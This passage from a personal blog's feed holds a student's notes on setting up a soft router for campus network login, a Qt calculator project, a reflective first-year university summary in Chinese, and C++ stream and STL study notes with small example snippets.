src="https://www.youtube.com/embed/gsrAj1vySaE" frameborder="0" loading="lazy" allowfullscreen></iframe></div></p><h3 id="access-soft-router-backend">Access Soft Router Backend</h3><p>Insert the TF card correctly into the soft router and ensure the sysindicator light on your soft router is normal.<img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2019.46.52.png"/></p><p>Connect one end of a network cable to the campus wired network portand the other end to the WAN port of the soft router. Connect one end ofanother network cable to the LAN port of the soft router and the otherend to your computer. At this point, the computer and soft router are onthe same local network. Access the soft router’s backend through its IPaddress (this is usually provided by the seller; if not, you can checkthe gateway’s IP address or disable DHCP for manual assignment) in thebrowser and log in with username and password. <imgsrc="https://picx.zhimg.com/80/v2-7d989b04c23b0a4f5f0bef25068a117a_1440w.png" />### Using curl Command in Command Line Access the soft router’s commandline tool and use the curl command written above to perform campusnetwork authentication. It’s best to try pinging Baidu to see if itworks. <imgsrc="https://pica.zhimg.com/80/v2-1b493abb1ef9054903270b5bdffeabb5_1440w.png" /></p><h3 id="configure-internet-access">Configure Internet Access</h3><p>I use OpenClash, which is built-in software. You can use any proxysoftware, then configure it like on other devices by entering thesubscription URL. <imgsrc="https://pic1.zhimg.com/80/v2-d9aab76bd341cae45b8c5524653098e7_1440w.png" /></p><h2 id="configure-hard-router">Configure Hard Router</h2><p>Since soft routers cannot send wireless network signals like regularrouters (at least my entry-level machine cannot), you need to use a realrouter to send WiFi signals or provide more LAN ports for wired networkconnections. My ASUS router serves this purpose. Focus on the cableconnected to the soft router’s LAN port, and change the end that wasconnected to the computer to connect to the router’s WAN port. Ofcourse, you can also connect it to the LAN port, but you need to use therouter’s AP mode. The difference is that when connected to the WAN port,the soft router becomes the upstream router, and you cannot access thesoft router’s backend by entering its IP address (at least with mycurrent technical level); when connected to the LAN port, the softrouter remains on the same local network as our devices (at this point,the router acts like a switch with wireless functionality).</p><p>I connected it to the WAN port, then used any device that can accessthe internet to connect to the WiFi signal and complete the initialrouter setup based on the information provided on the back of therouter, such as name and password. This process is relatively simple andwon’t be elaborated on further.</p><h1 id="final-notes">Final Notes</h1><p>Due to the limitations of school power and network outages causingdevices to disconnect at night, we can’t repeatedly log into the softrouter backend to connect to the campus network every time. However, itseems that after enabling seamless authentication, it can automaticallyreconnect even after being disconnected for a while. I’m still planningto write an automatic login and logout script when I have time to complywith school regulations.</p><p>The above method indeed works for my situation, and the router Ibought itself supports flashing. Actually, for general home networksthat don’t require authentication, you don’t need a soft router. SomeASUS router series support flashing Merlin firmware, which isessentially an OpenWrt system adapted for ASUS routers. Since I haven’tfound a better solution yet, I can only maintain the current situation.The soft router serves more as a side router, specifically providingad-blocking services for the TV box at home, or streaming acceleration,and most importantly, enabling internet access to watch foreignstreaming software.</p><p>Reference Article <ahref="https://blog.csdn.net/qq_30763587/article/details/119523231">ImplementingCampus Network Web Authentication under OpenWrt</a> <ahref="https://zhuanlan.zhihu.com/p/443145372?utm_campaign=shareopn&amp;utm_medium=social&amp;utm_oi=1137483569697013760&amp;utm_psn=1609660582969470976&amp;utm_source=wechat_session">HuazhongUniversity of Science and Technology Campus NetworkAuto-Reconnection</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools &amp; Workflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Computer Networks - Campus Network - Routing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt</title>
      <link href="/2022/09/03/CPP/Qt/"/>
      <url>/2022/09/03/CPP/Qt/</url>
      
        <content type="html"><![CDATA[<p><ahref="https://github.com/liubf21/Qt-Practical-Training-For-Programming">Feiye’sQt Repository</a></p><h1 id="implementation-of-a-simple-calculator">Implementation of aSimple Calculator</h1><p>Following the video below step by step, you can get a generalunderstanding of Qt, and I personally wrote the functionality forseveral keys, which can be considered my first simple program with a UIinterface.</p><div class="video-container"><iframe src="https://www.youtube.com/embed/txGRU7OrTZo" frameborder="0" loading="lazy" allowfullscreen></iframe></div><p><ahref="https://github.com/hustlixiang21/Qt_Practice/tree/main/Calculator">Clickto view source code</a></p><p>Effect image: <imgsrc="https://picx.zhimg.com/80/v2-9e256ce589cf3dff00310312c0ad7f46_1440w.png"alt="Effect image" /> # Adding Program Icon Reference blog: <ahref="https://blog.csdn.net/yc__coder/article/details/107425940?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-107425940-blog-79359228.pc_relevant_multi_platform_featuressortv2dupreplace&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-107425940-blog-79359228.pc_relevant_multi_platform_featuressortv2dupreplace&amp;utm_relevant_index=3">SettingQt Application Icon on Mac</a></p><p>Of course, the best way is to check the <ahref="https://resources.qt.io/learning-hub">officialdocumentation</a>.</p>]]></content>
      
      
      <categories>
          
          <category> Tools &amp; Workflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Language </tag>
            
            <tag> UI Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大一学年总结</title>
      <link href="/2022/08/04/Personal/%E5%A4%A7%E4%B8%80%E5%AD%A6%E5%B9%B4%E6%80%BB%E7%BB%93/"/>
      <url>/2022/08/04/Personal/%E5%A4%A7%E4%B8%80%E5%AD%A6%E5%B9%B4%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p><font size=5px>Get busy living or get busy dying.</font></p></blockquote><iframe src="//player.bilibili.com/player.html?aid=505421421&amp;bvid=BV1Sg411F7cb&amp;cid=405595939&amp;page=1" width="100%" height="540" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe><h1 id="一个阶段的结束">一个阶段的结束</h1><p>滴滴滴…</p><p>高考结束的铃声响起，身上的重担全部消失了，高中三年第一次全身心放松的离开我的母校，也是最后一次。</p><p><imgsrc="https://pic4.zhimg.com/80/v2-f087e91d7da10e616c5abb9effd0833c_1440w.jpeg" /></p><p>在洪高旁边拍摄的最后一张照片，标志高中的结束，我也搬离了那里。这条路，我走过很多很多次，这个湖，我也曾远眺过很多很多次。那时的我喜欢望着远方憧憬着大学的一切，充满梦想与激情。我就是那么一个感性，拥有着一个丰富内心世界的人。</p><blockquote><p>离开了，就永远回不去了。另一个残酷的事实就是，我即将脱离父母的羽翼，独立追求着自己梦想…</p></blockquote><hr /><h1 id="开端">开端</h1><p>带着高考的些许不甘心和迈入新阶段的激动与憧憬。我来到了这里。1037号森林——华中科技大学。</p><p><imgsrc="https://pic2.zhimg.com/80/v2-35ae425967378f31ee31cbfc10d0178d_1440w.jpeg" /></p><hr /><p>站在校门前，身旁是大包小包的物件，看着这个陌生的地方，看着这些陌生的人，憧憬着未来几年大学的生活，探索属于我自己的一条路…</p><p><img src="https://pic1.zhimg.com/80/v2-57a85bdc69159d055a04b90d4570d075_1440w.jpeg" alt="Pulpit rock" width="500" height="650"></p><hr /><p>一段新的、未知的甚至可能是艰难的旅程就此开始…</p><h1 id="适应">适应</h1><p>初入大学的我，第一次的挑战，是为期19天的军训，唯一的收获是认识了许多不同的人，听到了许多不同的事儿，最开心的时候莫过于大家坐在一起开心的聊着聊那。累但没有什么压力。</p><p>大学的第一堂课没记错的话应该是微积分，进入一个只在视频上见到过的大教室，坐满了人。和那很窄的桌子，时不时吱吱作响的椅子。四块可以挪动的黑板，上课铃声响起，总之，第一堂课就那么开始了，学习生活就那么开始了。</p><p>刚开始，课不是很多，难度也不是很大。令我感到最不同的是，那种自由的感觉，没有人催促你的感觉，甚至是没有管你的感觉。有大把的时间可以自我支配，打游戏，看手机，刷视频都行。</p><p>我当时就不停的问自己，你想要的生活是什么？我的决定就是，誓死不做摆烂人，我要成为一个能够控制自己身体和意志的人，我需要提高自己各方面的能力！</p><p>我迈开的第一步就是加入学院的学生组织，媒体宣传部，因为我想提升自己社交，工作能力和学习一些实用技术，例如摄影，p图、推文排版。我也认识了很多很多的人，他们对我的帮助也很大。</p><p>第一个学期，学习方面我好像陷入了另一个误区，所有的课程我都不听，自己去学，有的课甚至不去，去图书馆自习，我觉得自己能够搞得好，但是现实似乎略显骨感，分数并不高。好在通过期末痛苦的复习，取得了不错的成绩，没记错的话加权的排名在整个学院应该是第九，分流到信安应该是第三。其实并没有什么出众的地方，无非就是认真复习而已。</p><p>这可能是属于我的一个特质吧，初入一个新的阶段，我适应得会比较快，我也能保持一种谦卑的心态，能够沉得下心来去专注自己的事情。同时也不得不坦白我的一个缺点，浮躁，通常是一切顺利的时候，会把自己的姿态放高，自我感觉良好，然后一个打击之后气焰全无。这一点在第二个学期得到了印证。</p><h1 id="改变">改变</h1><p>经过一个学期的适应，我在寒假期间也仔细反思了一下自己的问题，并做出了一些改变。</p><ul><li>认真听课，不迟到，也不早退，不缺课</li><li>找寻自己的方向，探索自己喜欢的方向，找到自己的兴趣</li><li>尽量更多的参加的课外活动，利用好自身的资源</li><li>规划好自己时间，做到能够掌控自己的一切</li></ul><p>而此刻我坐在这里，回顾当时自己的思考，我认为我的这个学期，我过的是相当充实的。</p><p>这第二个学期，我只有在学校解封那一天，和室友出去浪的那一晚上，逃了一节公选课，其余的时候，我从未逃过一节课，即使它是水课，不听的状况仍然也会出现，但是能够认真去做自己事情也算是一种进步，自己感兴趣的地方也会听一听。</p><p>其他的主要的课程，我上课听的时候真的有的时候是晕晕乎乎的，特别是线性代数课程，由于我并没有预习过，每节课都很难受，看着自己陌生的概念，她讲着，我还在看之前的内容。所以我课下作业的时候，会花大量的时间去复习ppt，想清楚每一个细节，作业也会很认真的完成，最后结果也令我非常的满意。其他的课程我几乎也是这样去学习的，我始终坚信，大学的课程并不是为了考倒你，即使会有几个难题，只要平时勤于思考，考试周认真复习，想取得好成绩绝对是不难的。</p><p>我也重拾自己初中的兴趣爱好，踢足球，即使我的身材有点走样了，技术也很不是很好，但是我依然选择加入了院里的足球队，参加过组织的训练，认识了很多学长，很多朋友。我们一同征战华工杯，即使我们在小组内就被淘汰了，我们没有失掉自己的信心，大家相聚一起，有球踢，有天聊，开心就好。</p><p>课外的竞赛方面，我跟两个数院的学长参加了美赛，我是作为论文手，我当时课下自学了latex排版，最终的翻译排版都是由我完成的。结果也非常令我出乎意料，拿了一个F（Finalist）奖(获奖率比较低)，当时真的很激动开心，可以算是我大学第一个竞赛的奖项。值得一提的还有我人生中第一笔奖学金，新生学习优秀奖学金（600元）。这些都是对于我的努力的肯定，心里的确是非常的开心。</p><p>课余的学习生活中，我也学习过不少的课外知识，学习过py，cpp和linux命令行，这些要么在我<ahref="https://github.com/">github的仓库</a>里，要么在<ahref="https://hustlixiang21.github.io/">我的博客</a>里都留下了记录，我感觉更多的还是被课内繁杂的课程占用了大部分的时间，被加权分数所裹挟，我深知自己不该把加权看的太重，但是周围的环境却时刻提醒着我自己，需要拿到保研名额并不容易。而我现在的想法就是<strong>保持+拓宽</strong>。保持住自己的加权就行，不必日日夜夜围绕着分数，我觉的更重要的还是练就自己一身的本领，学习自己感兴趣的技术。如果可以，加入一个科研团队，锻炼自己的科研水平。</p><h1 id="总结">总结</h1><p>在华科的一年时光就这么过去了，而自己也褪去了年幼时的那份稚嫩，羽翼渐丰。这一年里，有对新生活的不断适应与改变，认识了诸多好友，参与了许多有趣的活动，收获了不可多得的快乐；在学习生活方面也取得了不错的成绩，学年加权91.15，位列4/98，甚至拿了美赛的一个奖项；情感方面，少了高中时的一些臭毛病，可以说是慢慢走向正轨，也不知不觉在一起三年多了，希望以后的路也能继续一起走完吧。</p><p>至于对未来的憧憬，希望自己能够成为一个自己想要成为的人，走出国门去看看世界，抑或是进入国内更高层次的学府去深造，一份安稳的工作，一个美满的家庭，其实这已经是很多人梦寐以求的生活，是以不敢奢望太多。我只知我不惧未知，也敢于拼搏…</p><blockquote><p>Having dreams is what makes life tolerable.</p></blockquote><p>深知自己文笔有限，还是多读读书，多写点东西慢慢提升吧，这一年的回顾，就到这了…</p><p align="right"><font size=4><b>八月四日晚八点，于校图书馆</b></font></p><hr /><p><br></p><p style="text-align:center;font-size:20px;">最后附上几张照片，以纪念这匆匆逝去的一年。</p><div class="gallery-container" data-type="data" data-button="" data-limit="10" data-first="10">    <div class="gallery-items">[{"url":"https://pic1.zhimg.com/80/v2-e72f84985fe12334cccd92b012f72336_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-e858eda3937d5b629d5a11013a110af4_1440w.jpeg","alt":"img","title":""},{"url":"https://pic4.zhimg.com/80/v2-025ae25e21b536130df53a272fbb34c4_1440w.jpeg","alt":"img","title":""},{"url":"https://pic1.zhimg.com/80/v2-a4f01cff9ab56596369c93d988d3db47_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-e9135724d7f5c138a04a5e6f38bd84c7_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-5a8d823eb451fc6855cb9f9a781723dd_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-0256b20f83c5e2bcdce8de54464eb774_1440w.jpeg","alt":"img","title":""},{"url":"https://pic1.zhimg.com/80/v2-ebf47ce94ec315447883cdd8f664ac91_1440w.jpeg","alt":"img","title":""}]</div>  </div>]]></content>
      
      
      <categories>
          
          <category> Personal Reflections </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人反思 </tag>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stream Library and Input/Output</title>
      <link href="/2022/08/04/CPP/Stream%20Library%20and%20Input&amp;Output/"/>
      <url>/2022/08/04/CPP/Stream%20Library%20and%20Input&amp;Output/</url>
      
        <content type="html"><![CDATA[<h1 id="io-stream-concepts-and-stream-library-structure">I/O StreamConcepts and Stream Library Structure</h1><p>A program creates a <strong>stream object</strong>: * When a programexchanges information with the external environment, there are twoobjects: one is the <strong>object in the program</strong>, and theother is the <strong>file object</strong>. * A stream is an abstractionthat is responsible for establishing connections between <strong>dataproducers</strong> and <strong>data consumers</strong> and managing dataflow.</p><p>Specify that this stream object establishes a connection with acertain file object. The program operates the stream object, and theobject acts on the connected file object through the file system.</p><blockquote><p>Operating systems treat keyboards, screens, printers, andcommunication ports as extended files, and this processing isimplemented through the operating system’s device drivers. These devicesare equivalent to disk files.</p></blockquote><p>Read operations in the general sense are called<strong>extraction</strong> (from the stream) in stream data objects,and write operations are called <strong>insertion</strong> (into thestream).</p><p style="text-align:center;">I/O Stream Class List</p><p><imgsrc="https://pic3.zhimg.com/80/v2-4544fd2b14037c1638862690c745edc2_1440w.png" /></p><h1 id="output-streams">Output Streams</h1><p>The three most important output streams: * ostream * ofstream *ostringstream</p><p>Predefined output stream objects: * cout standard output * cerrstandard error output, no buffering, content sent to it is immediatelyoutput. * clog similar to cerr, but with buffering, output when bufferis full.</p><h2 id="constructing-output-stream-objects">Constructing Output StreamObjects</h2><p>Common methods for constructing file output streams: 1. Use defaultconstructor, then call open member function. <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ofstream myFile; <span class="comment">//Define a static file output stream object</span></span><br><span class="line">myFile.<span class="built_in">open</span>(<span class="string">&quot;filename&quot;</span>); <span class="comment">//Open file, establish connection between stream object and file</span></span><br></pre></td></tr></table></figure> 2. Specifyfilename when calling constructor: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ofstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure> 3. Can specify modewhen constructing object or opening file with open <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ofstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>, ios_base::out | ios_base::binary)</span></span>;</span><br></pre></td></tr></table></figure> 4. Canalso use the same stream object to open different files sequentially(only one is open at a time)</p><h2 id="file-output-stream-member-functions">File Output Stream MemberFunctions</h2><p>Three types: * Member functions equivalent to manipulators. * Memberfunctions that perform unformatted write operations. * Other memberfunctions that modify stream state and are different from manipulatorsor insertion operators.</p><p>File output stream member functions * open function * Associates thestream with a specific disk file. * Need to specify opening mode. * putfunction * Writes a character to the output stream. * write function *Writes a block of content from memory to a file output stream * seekpand tellp functions * Operate the internal pointer of the file stream *close function * Closes the disk file associated with a file outputstream * Error handling functions * Error handling when writing to astream</p><h2 id="output-to-text-files">Output to Text Files</h2><p>Standard output device display is treated as a text file by thesystem, so we use output to standard device as an example to introducetext file output format control.</p><h3 id="insertion-operator">Insertion Operator</h3><p>Insertion (&lt;&lt;) operator: Pre-designed for all standard C++ datatypes, used to transfer bytes to an output stream object.</p><h3 id="manipulators">Manipulators</h3><p>Insertion operators work with manipulators to control output format.* Many manipulators are defined in the ios_base class (such as hex())and &lt;iomanip&gt; header file (such as setprecision()). * Controloutput width: Place setw manipulator in the stream or call width memberfunction to specify output width for each item. &gt;setw and width onlyaffect the immediately following output item, but other stream formatmanipulators remain effective until changed. * dec, oct and hexmanipulators set the default base for input and output</p><h4 id="setting-width">Setting Width</h4><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%BD%BF%E7%94%A8width%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E5%AE%BD%E5%BA%A6/main.cpp">widthsource code</a> <ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%BD%BF%E7%94%A8setw%E6%93%8D%E7%BA%B5%E7%AC%A6%E6%8C%87%E5%AE%9A%E5%AE%BD%E5%BA%A6/main.cpp">setwsource code</a></p><blockquote><p>width member function is declared in iostream. If using setw or anyother manipulator with parameters, must include<strong>iomanip</strong></p></blockquote><h4 id="alignment">Alignment</h4><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E8%AE%BE%E7%BD%AE%E5%AF%B9%E9%BD%90%E6%96%B9%E5%BC%8F/main.cpp">Setalignment source code</a></p><h4 id="setiosflags-manipulator">setiosflags Manipulator</h4><p>In this program, left alignment is set by using the setiosflagsmanipulator with parameters. setiosflags is defined in the iomanipheader file. * Parameter ios_base::left is a static constant ofios_base, so the ios_base:: prefix must be included when referencing. *Here we need to use the resetiosflags manipulator to <strong>turn offthe left alignment flag</strong>. setiosflags is different from widthand setw, its <strong>effect is persistent</strong> until resetiosflagsis used to restore the default value. * The parameter of setiosflags isthe format flag value of the stream, which can be<strong>combined</strong> using the bitwise OR (|) operator.</p><p><imgsrc="https://pic4.zhimg.com/80/v2-aebc935a529984f183707440dd181431_1440w.png" /></p><h4 id="precision">Precision</h4><p>The default value for floating-point output precision is 6, forexample: 3466.98. * To change precision: setprecision manipulator(defined in iomanip header file) * If fixed or scientific is notspecified, the precision value represents the number of significantdigits. * If ios_base::fixed or ios_base::scientific is set, theprecision value represents the number of digits after the decimalpoint.</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E7%B2%BE%E5%BA%A6/main.cpp">Controloutput precision - without specifying fixed or scientific</a> <ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E7%B2%BE%E5%BA%A6%E2%80%94%E6%8C%87%E5%AE%9Afixed/main.cpp">Controloutput precision - specifying fixed</a> <ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E7%B2%BE%E5%BA%A6%E2%80%94%E6%8C%87%E5%AE%9Ascientific">Controloutput precision - specifying scientific</a></p><h2 id="output-to-binary-files">Output to Binary Files</h2><h3 id="binary-file-stream">Binary File Stream</h3><p>Use the mode parameter in the ofstream constructor to specify binaryoutput mode; construct a stream in the usual way, then use the setmodemember function to change the mode after the file is opened; completeoutput through the binary file output stream object.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Date</span> &#123; </span><br><span class="line"><span class="type">int</span> mon, day, year; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Date dt = &#123; <span class="number">6</span>, <span class="number">10</span>, <span class="number">92</span> &#125;;</span><br><span class="line"><span class="function">ofstream <span class="title">file</span><span class="params">(<span class="string">&quot;date.dat&quot;</span>, ios_base::binary)</span></span>;</span><br><span class="line">file.<span class="built_in">write</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span> *&gt;(&amp;dt),<span class="built_in">sizeof</span>(dt));</span><br><span class="line">file.<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>The write function does not stop when encountering null characters,so it can write complete class structures. This function takes twoparameters: a char pointer (actual address) and the number of bytes towrite. <strong>Note that reinterpret_cast is needed to explicitlyconvert the object’s address to char * type.</strong></p></blockquote><h2 id="output-to-strings">Output to Strings</h2><p>Using strings as the target of output streams can achieve thefunction of converting other data types to strings.</p><h3 id="string-output-stream-ostringstream">String Output Stream(ostringstream)</h3><p>Used to construct strings</p><p>Functions: * Supports all operations of ofstream class except openand close * str function can return the currently constructed string</p><p>Typical applications * Convert numerical values to strings</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%95%B0%E5%80%BC%E8%BD%AC%E5%8C%96%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2/main.cpp">Usingostringstream to convert numerical values to strings</a></p><h1 id="input-streams">Input Streams</h1><p>Important input stream classes: * istream class is most suitable forsequential text mode input. cin is its instance. * ifstream classsupports disk file input. * istringstream</p><h2 id="constructing-input-stream-objects">Constructing Input StreamObjects</h2><ul><li>If a filename is specified in the constructor, the file isautomatically opened when constructing the object. <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ifstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li>Use the open function to open the file after calling the defaultconstructor. <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifstream myFile;<span class="comment">//Create a file stream object</span></span><br><span class="line">myFile.<span class="built_in">open</span>(<span class="string">&quot;filename&quot;</span>); <span class="comment">//Open file &quot;filename&quot;</span></span><br></pre></td></tr></table></figure></li><li>Can specify mode when opening file <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ifstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>, ios_base::in | ios_base::binary)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h2 id="using-extraction-operator-for-input-from-text-files">UsingExtraction Operator for Input from Text Files</h2><p>Extraction operator (&gt;&gt;) is pre-designed for all standard C++data types. It is the easiest way to get bytes from an input streamobject. Many manipulators in the ios class can be applied to inputstreams. But only a few have actual impact on input stream objects, themost important being the base manipulators dec, oct and hex.</p><h2 id="input-stream-related-functions">Input Stream RelatedFunctions</h2><ul><li>open function associates the stream with a specific disk file.</li><li>get function is very similar to the extraction operator (&gt;&gt;),the main difference is that get function includes whitespace characterswhen reading data. (Introduced in Chapter 6)</li><li>getline function reads multiple characters from the input stream andallows specifying input termination characters. After reading iscomplete, the termination character is removed from the read content.(Introduced in Chapter 6)</li><li>read member function reads bytes from a file to a specified memoryarea, with the length parameter determining the number of bytes to read.Reading ends when encountering end of file or end of file markercharacter in text mode files.</li><li>seekg function is used to set the pointer for reading data positionin file input stream.</li><li>tellg function returns the current position of the file readpointer.</li><li>close function closes the disk file associated with a file inputstream.</li></ul><h2 id="examples">Examples</h2><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E4%B8%80%E4%B8%AA%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%AE%B0%E5%BD%95%E5%88%B0%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%84%E4%B8%AD/main.cpp">Reada binary record from file to a structure</a> <ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E7%94%A8seekg%E5%87%BD%E6%95%B0%E8%AE%BE%E7%BD%AE%E4%BD%8D%E7%BD%AE%E6%8C%87%E9%92%88/main.cpp">Useseekg function to set position pointer</a> <ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E8%AF%BB%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%B9%B6%E6%98%BE%E7%A4%BA%E5%87%BA%E5%85%B6%E4%B8%AD0%E5%85%83%E7%B4%A0%E7%9A%84%E4%BD%8D%E7%BD%AE/main.cpp">Reada file and display positions of 0 elements in it</a></p><h2 id="input-from-strings-istringstream">Input from Strings(istringstream)</h2><p>Used to read data from strings, set the string to read in theconstructor.</p><p>Functions * Supports all operations of ifstream class except open andclose</p><p>Typical applications * Convert strings to numerical values</p><h1 id="inputoutput-streams">Input/Output Streams</h1><h2 id="two-important-inputoutput-streams">Two Important Input/OutputStreams</h2><p>An iostream object can be a source or destination of data. * Twoimportant I/O stream classes are derived from iostream: fstream andstringstream * These classes inherit the functionality of the istreamand ostream classes described earlier.</p><h2 id="fstream-class">fstream Class</h2><p>fstream class supports disk file input and output. * If you need toread from and write to a specific disk file in the same program, you canconstruct an fstream object. * An fstream object is a single stream withtwo logical sub-streams, one for input and the other for output.</p><h2 id="stringstream-class">stringstream Class</h2><p>stringstream class supports string-oriented input and output * Can beused for alternating read and write operations on the same stringcontent, also composed of two logical sub-streams.</p><h1id="comprehensive-example---personal-bank-account-management">ComprehensiveExample - Personal Bank Account Management</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update5">Clickto view source code</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Generic Programming and C++ Standard Template Library (STL)</title>
      <link href="/2022/08/04/CPP/Generic%20Programming%20and%20C++%20Standard%20Template%20Library%20(STL)/"/>
      <url>/2022/08/04/CPP/Generic%20Programming%20and%20C++%20Standard%20Template%20Library%20(STL)/</url>
      
        <content type="html"><![CDATA[<p>First, here are two reference articles: <ahref="https://blog.csdn.net/weixin_61907955/article/details/123855928">STLFunction Reference</a> <ahref="https://blog.csdn.net/weixin_41969690/article/details/106648441">Whatis STL?</a></p><h1 id="generic-programming-and-stl-structure">Generic Programming andSTL Structure</h1><h2 id="basic-concepts-of-generic-programming">Basic Concepts of GenericProgramming</h2><p>Refers to writing programs that <strong>do not depend on specificdata types</strong>. Templates are the main tools of genericprogramming.</p><p>Terminology: Concepts</p><p>Used to define data types that have certain functions. For example: *The concept of “all data types that can be compared (with comparisonoperators)” is denoted as Comparable * The concept of “data types thathave public copy constructors and can be assigned with ‘=’” is denotedas Assignable * The concept of “all data types that can be compared,have public copy constructors and can be assigned with ‘=’” is denotedas Sortable.</p><p>For two different concepts A and B, if all the functions required byconcept A are also required by concept B, then concept B is said to be asub-concept of concept A. For example: * Sortable is both a sub-conceptof Comparable and a sub-concept of Assignable</p><blockquote><p>Actually, this sub-concept is similar to derived classes from baseclasses.</p></blockquote><p>Terminology: Models</p><p>Model: A data type that conforms to a concept is called a model ofthat concept * int type is a model of the Comparable concept; * Staticarray type is not a type of the Assignable concept (static arrays cannotbe assigned).</p><p>Using concepts as template parameter names</p><ul><li>Many STL implementation codes use concepts to name templateparameters.</li><li>Give a concept a name and use that name as a template parametername.</li></ul><p>For example: Representing the prototype of a function template likeinsertionSort: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">Sortable</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertionSort</span><span class="params">(Sortable a[], <span class="type">int</span> n)</span></span>;</span><br></pre></td></tr></table></figure></p><h1 id="stl-introduction">STL Introduction</h1><p><strong>Standard Template Library</strong> provides some verycommonly used data structures and algorithms.</p><p>Basic components of STL: * Container * Iterator * Function object *Algorithms</p><p>Basic relationships: * Iterator is the bridge between algorithms andcontainers. Use iterators as algorithm parameters and access containersthrough iterators rather than passing containers directly as algorithmparameters; * Use function objects as algorithm parameters rather thanmaking the operations performed by functions part of the algorithm.</p><p>Relationship diagram:</p><p><imgsrc="https://pic4.zhimg.com/80/v2-277324313f500492215f4604944da7fb_1440w.png" /></p><h2 id="basic-components-of-stl---containers">Basic Components of STL -Containers</h2><p>Containers are objects that hold a group of elements. The containerclass library includes seven basic containers: vector, deque, list, set,multiset, map, and multimap.</p><ul><li>Sequential containers: array, vector, deque, forward_list (singlylinked list), list (list, underlying is doubly linked list);</li><li>Ordered associative containers: set, multiset, map, 